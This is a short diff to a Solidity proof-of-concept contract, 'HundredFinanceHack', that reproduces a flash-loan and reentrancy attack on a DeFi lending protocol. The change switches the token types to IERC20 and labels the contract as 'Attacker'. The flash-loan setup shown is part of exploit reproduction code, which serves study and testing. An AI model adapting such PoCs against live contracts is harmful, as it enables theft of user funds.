@@ -20,12 +20,14 @@ contract HundredFinanceHack is FlashLoan, Reentrancy, PoC {
 
     function initiateAttack() external {
         // Setup token pair and amounts to flash loan from UniswapV2
-        address[] memory tokens = new address[](2);
-        tokens[0] = address(GnosisTokens.USDC);
-        tokens[1] = address(wxdai);
+        IERC20[] memory tokens = new IERC20[](2);
+        tokens[0] = GnosisTokens.USDC;
+        tokens[1] = wxdai;
         uint256[] memory amounts = new uint256[](2);
         amounts[0] = 2117765617657;
         amounts[1] = 0;
+
+        setAlias(address(this), "Attacker");
 
         // Trigger the flash loan from the passed provider
         // This will call _executeAttack which has logic to determine if it's in the flash loan callback
